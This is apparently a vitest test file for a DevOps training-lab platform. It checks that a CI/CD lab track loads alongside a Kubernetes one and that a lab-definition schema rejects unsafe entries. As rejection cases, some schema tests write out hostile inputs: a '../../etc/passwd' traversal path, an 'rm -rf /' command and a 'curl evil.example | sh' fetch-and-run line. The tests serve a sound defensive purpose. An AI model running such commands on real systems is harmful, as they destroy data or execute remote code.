/**
 * PLATFORM-CICD-001 — the catalog and schema, with a second track present.
 *
 * Covers story tests 1 and 2 (the CI/CD track loads; CICD-001 … CICD-010
 * load) and the schema rules the file-backed sandbox introduced.
 *
 * The point of most of these is *genericity*: a second track must arrive
 * without any code learning it exists, and without the first track changing.
 */
import { afterEach, beforeAll, describe, expect, it } from 'vitest';
import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import {
  LabDefinitionError,
  LabRegistry,
  REQUIREMENT_TYPES,
  WORKSPACE_REQUIREMENTS,
  parseLabDefinition,
  requirementEvidence,
  titleCase,
  trackTitle,
} from '../src/index.js';
import { LABS_DIR } from './helpers.js';

const CICD_IDS = [
  'CICD-001',
  'CICD-002',
  'CICD-003',
  'CICD-004',
  'CICD-005',
  'CICD-006',
  'CICD-007',
  'CICD-008',
  'CICD-009',
  'CICD-010',
];

let registry: LabRegistry;

beforeAll(async () => {
  registry = new LabRegistry(LABS_DIR);
  await registry.load();
});

describe('the CI/CD track loads (story test 1)', () => {
  it('registers every lab on disk with no load errors', () => {
    expect(registry.loadErrors).toEqual([]);
    expect(registry.size).toBe(20);
  });

  it('appears as a track with a readable title and its own topics', () => {
    const track = registry.track('cicd');
    expect(track).toMatchObject({ track: 'cicd', title: 'CI/CD', labCount: 10 });
    expect(track?.topics.map((t) => t.topic)).toEqual([
      'fundamentals',
      'github-actions',
      'jenkins',
      'pipelines',
      'troubleshooting',
    ]);
    expect(track?.difficulties).toEqual(['beginner', 'intermediate', 'advanced']);
  });

  it('leaves the Kubernetes track exactly as it was', () => {
    const track = registry.track('kubernetes');
    expect(track).toMatchObject({ track: 'kubernetes', title: 'Kubernetes', labCount: 10 });
    expect(registry.labsForTrack('kubernetes').map((l) => l.id)).toEqual([
      'K8S-001',
      'K8S-002',
      'K8S-003',
      'K8S-004',
      'K8S-005',
      'K8S-006',
      'K8S-007',
      'K8S-008',
      'K8S-009',
      'K8S-010',
    ]);
  });

  it('titles an unknown track mechanically, so a new one needs no code', () => {
    expect(trackTitle('terraform')).toBe('Terraform');
    expect(trackTitle('ansible')).toBe('Ansible');
    expect(trackTitle('monitoring')).toBe('Monitoring');
    expect(titleCase('github-actions')).toBe('Github Actions');
  });
});

describe('CICD-001 through CICD-010 load (story test 2)', () => {
  it('registers all ten, in catalog order', () => {
    expect(registry.labsForTrack('cicd').map((l) => l.id)).toEqual(CICD_IDS);
  });

  it.each(CICD_IDS)('%s is complete and well formed', (id) => {
    const lab = registry.get(id);

    expect(lab.track).toBe('cicd');
    expect(lab.title.length).toBeGreaterThan(8);
    expect(lab.story).toBeTruthy();
    expect(lab.objectives.length).toBeGreaterThanOrEqual(3);
    expect(lab.task.description.length).toBeGreaterThan(400);
    expect(lab.requirements.length).toBeGreaterThanOrEqual(3);
    expect(lab.skills.length).toBeGreaterThanOrEqual(3);

    // A three-rung hint ladder, none of which may hand over the answer.
    expect(lab.hints.map((h) => h.level)).toEqual([1, 2, 3]);

    // Every check has student-facing wording, so the UI never shows a raw
    // requirement type — which would both read as an internal identifier and
    // leak how the check is implemented.
    for (const requirement of lab.requirements) {
      expect(requirement.label, `${id} ${requirement.type}`).toBeTruthy();
      expect(requirement.label, `${id} ${requirement.type}`).not.toBe(requirement.type);
      expect(REQUIREMENT_TYPES, `${id} ${requirement.type}`).not.toContain(requirement.label);
    }
  });

  it('cites official documentation and nothing commercial', () => {
    for (const id of CICD_IDS) {
      const hosts = registry.get(id).references.map((r) => new URL(r.url).hostname);
      expect(
        hosts.some((h) => /^(docs\.github\.com|www\.jenkins\.io|docs\.jenkins\.io|jenkins\.io|git-scm\.com|docs\.docker\.com)$/.test(h)),
        `${id}: ${hosts.join(', ')}`,
      ).toBe(true);
      expect(hosts.some((h) => /kodekloud|udemy|acloudguru|pluralsight/.test(h)), id).toBe(false);
    }
  });

  it('forms a prerequisite chain that starts somewhere reachable', () => {
    expect(registry.get('CICD-001').prerequisites).toEqual([]);
    expect(registry.get('CICD-002').prerequisites).toEqual(['CICD-001']);
    // Every prerequisite resolves to a registered lab (the registry unregisters
    // labs whose prerequisites dangle, so a broken chain would fail the count
    // assertion above too).
    for (const id of CICD_IDS) {
      for (const prerequisite of registry.prerequisitesOf(registry.get(id))) {
        expect(prerequisite.available, `${id} → ${prerequisite.id}`).toBe(true);
      }
    }
  });

  /*
   * The card may repeat the task summary — a student is meant to read what the
   * lab asks for. What it must never carry is the machine-readable *answer*:
   * the requirement objects (expected job ids, triggers, stage names) and the
   * setup block, which for CICD-010 is the injected fault itself.
   */
  it('never exposes the expected end state in the catalog projection', () => {
    for (const id of CICD_IDS) {
      const card = registry.summarise(registry.get(id)) as unknown as Record<string, unknown>;
      expect(Object.keys(card), id).not.toContain('requirements');
      expect(Object.keys(card), id).not.toContain('setup');
      expect(Object.keys(card), id).not.toContain('reset');
      expect(Object.keys(card), id).not.toContain('hints');

      const serialised = JSON.stringify(card);
      for (const type of REQUIREMENT_TYPES) {
        expect(serialised, `${id} leaks '${type}'`).not.toContain(type);
      }
    }
  });
});

describe('the schema keeps a lab and its sandbox consistent', () => {
  const BASE = [
    'id: CICD-901',
    'slug: cicd-901-demo',
    'title: Demo Lab',
    'track: cicd',
    'topic: pipelines',
    'difficulty: beginner',
    'duration_minutes: 15',
    'task:',
    '  summary: Do the thing.',
    '  description: A longer description of the thing.',
    'requirements:',
    '  - type: file_exists',
    '    path: Jenkinsfile',
    '    label: Jenkinsfile exists',
    'references:',
    '  - title: Jenkins pipeline syntax',
    '    url: https://www.jenkins.io/doc/book/pipeline/syntax/',
    'skills:',
    '  - cicd.jenkins.jenkinsfile.author',
  ].join('\n');

  function yaml(extra: string): string {
    return `${BASE}\n${extra}\n`;
  }

  /**
   * Assert a definition is rejected *for a stated reason*.
   *
   * `LabDefinitionError.message` is only a count; the operator-facing detail is
   * in `format()`, and that is what an author actually reads, so that is what
   * these assertions check.
   */
  function expectRejected(text: string, reason: RegExp): void {
    let error: unknown;
    try {
      parseLabDefinition(text);
    } catch (caught) {
      error = caught;
    }
    expect(error, `expected a rejection matching ${reason}`).toBeInstanceOf(LabDefinitionError);
    expect((error as LabDefinitionError).format()).toMatch(reason);
  }

  it('accepts a workspace lab that declares a seed and verifies it', () => {
    const def = parseLabDefinition(
      yaml(
        [
          'environment:',
          '  provider: workspace',
          '  isolation: workspace',
          'setup:',
          '  workspace: workspace',
          '  verify:',
          '    - type: file_exists',
          '      path: build.mjs',
          '      label: Build script is present',
        ].join('\n'),
      ),
    );
    expect(def.setup.workspace).toBe('workspace');
  });

  it('rejects a workspace lab that declares a seed with no verification', () => {
    expectRejected(
      yaml(['environment:', '  provider: workspace', '  isolation: workspace', 'setup:', '  workspace: workspace'].join('\n')),
      /setup\.verify must describe at least one check/,
    );
  });

  it('rejects Kubernetes manifests in a workspace lab, and a workspace seed in a Kubernetes lab', () => {
    expectRejected(
      yaml(
        [
          'environment:',
          '  provider: workspace',
          '  isolation: workspace',
          'setup:',
          '  manifests:',
          '    - initial/deployment.yaml',
          '  verify:',
          '    - type: file_exists',
          '      path: build.mjs',
          '      label: x',
        ].join('\n'),
      ),
      /setup\.manifests is not supported/,
    );

    expectRejected(
      yaml(
        [
          'environment:',
          '  provider: kubernetes',
          'setup:',
          '  workspace: workspace',
          '  verify:',
          '    - type: file_exists',
          '      path: build.mjs',
          '      label: x',
        ].join('\n'),
      ),
      /setup\.workspace is only supported/,
    );
  });

  it('rejects a mismatched isolation declaration', () => {
    expectRejected(
      yaml(['environment:', '  provider: workspace', '  isolation: namespace'].join('\n')),
      /environment\.isolation must be 'workspace'/,
    );
  });

  it('rejects an unknown sandbox kind', () => {
    expect(() => parseLabDefinition(yaml(['environment:', '  provider: firecracker'].join('\n')))).toThrow(
      LabDefinitionError,
    );
  });

  it('rejects a workspace path that could escape the sandbox', () => {
    const escaping = [
      'id: CICD-902',
      'slug: cicd-902-demo',
      'title: Demo Lab',
      'track: cicd',
      'topic: pipelines',
      'difficulty: beginner',
      'duration_minutes: 15',
      'environment:',
      '  provider: workspace',
      '  isolation: workspace',
      'task:',
      '  summary: Do the thing.',
      '  description: A longer description of the thing.',
      'requirements:',
      '  - type: file_exists',
      '    path: ../../etc/passwd',
      '    label: x',
      'references:',
      '  - title: Jenkins pipeline syntax',
      '    url: https://www.jenkins.io/doc/book/pipeline/syntax/',
      'skills:',
      '  - cicd.jenkins.jenkinsfile.author',
      '',
    ].join('\n');

    expectRejected(escaping, /relative workspace path/i);
  });

  it('rejects a workflow requirement outside .github/workflows', () => {
    expectRejected(
      yaml(
        [
          'environment:',
          '  provider: workspace',
          '  isolation: workspace',
          'setup:',
          '  workspace: workspace',
          '  verify:',
          '    - type: github_workflow_exists',
          '      path: ci/ci.yml',
          '      label: x',
        ].join('\n'),
      ),
      /inside \.github\/workflows/,
    );
  });

  it('carries no field anywhere that could hold a command line', () => {
    // A requirement naming a task can only name an id from the closed table.
    expect(() =>
      parseLabDefinition(
        yaml(
          [
            'environment:',
            '  provider: workspace',
            '  isolation: workspace',
            'setup:',
            '  workspace: workspace',
            '  verify:',
            '    - type: command_exit_code',
            '      command: rm -rf /',
            '      label: x',
          ].join('\n'),
        ),
      ),
    ).toThrow(LabDefinitionError);

    // ...and an unknown key is rejected rather than ignored.
    expect(() =>
      parseLabDefinition(
        yaml(
          [
            'environment:',
            '  provider: workspace',
            '  isolation: workspace',
            'setup:',
            '  workspace: workspace',
            '  script: curl evil.example | sh',
            '  verify:',
            '    - type: file_exists',
            '      path: build.mjs',
            '      label: x',
          ].join('\n'),
        ),
      ),
    ).toThrow(LabDefinitionError);
  });
});

describe('requirement evidence routing', () => {
  it('classifies every requirement type as reading a cluster or a workspace', () => {
    for (const type of REQUIREMENT_TYPES) {
      expect(['kubernetes', 'workspace'], type).toContain(requirementEvidence(type));
    }
  });

  it('routes the file-backed types to the workspace and leaves the rest alone', () => {
    for (const type of WORKSPACE_REQUIREMENTS) {
      expect(requirementEvidence(type), type).toBe('workspace');
    }
    for (const type of ['pod_exists', 'deployment_replicas', 'service_port'] as const) {
      expect(requirementEvidence(type), type).toBe('kubernetes');
    }
  });

  it('every shipped CI/CD requirement reads the workspace, never a cluster', () => {
    for (const id of CICD_IDS) {
      for (const requirement of registry.get(id).requirements) {
        expect(requirementEvidence(requirement.type), `${id} ${requirement.type}`).toBe('workspace');
      }
    }
  });
});

describe('a brand new track needs no code', () => {
  let scratch: string;

  afterEach(async () => {
    if (scratch) await rm(scratch, { recursive: true, force: true });
  });

  it('discovers a track nothing in the platform has heard of', async () => {
    scratch = await mkdtemp(path.join(tmpdir(), 'jtt-newtrack-'));
    const dir = path.join(scratch, 'ansible', 'ans-001-playbooks');
    await mkdir(path.join(dir, 'workspace'), { recursive: true });
    await writeFile(path.join(dir, 'workspace', 'site.yml'), '- hosts: all\n');
    await writeFile(
      path.join(dir, 'lab.yaml'),
      [
        'id: ANS-001',
        'slug: ans-001-playbooks',
        'title: Write a Playbook',
        'track: ansible',
        'topic: playbooks',
        'difficulty: beginner',
        'duration_minutes: 20',
        'environment:',
        '  provider: workspace',
        '  isolation: workspace',
        'task:',
        '  summary: Write a playbook.',
        '  description: A longer description of writing a playbook.',
        'setup:',
        '  workspace: workspace',
        '  verify:',
        '    - type: file_exists',
        '      path: site.yml',
        '      label: Playbook is present',
        'requirements:',
        '  - type: yaml_valid',
        '    path: site.yml',
        '    label: Playbook is valid YAML',
        'references:',
        '  - title: Git documentation',
        '    url: https://git-scm.com/doc',
        'skills:',
        '  - ansible.playbooks.author',
        '',
      ].join('\n'),
    );

    const fresh = new LabRegistry(scratch);
    await fresh.load();

    expect(fresh.loadErrors).toEqual([]);
    expect(fresh.tracks()).toEqual([
      expect.objectContaining({ track: 'ansible', title: 'Ansible', labCount: 1 }),
    ]);
  });
});
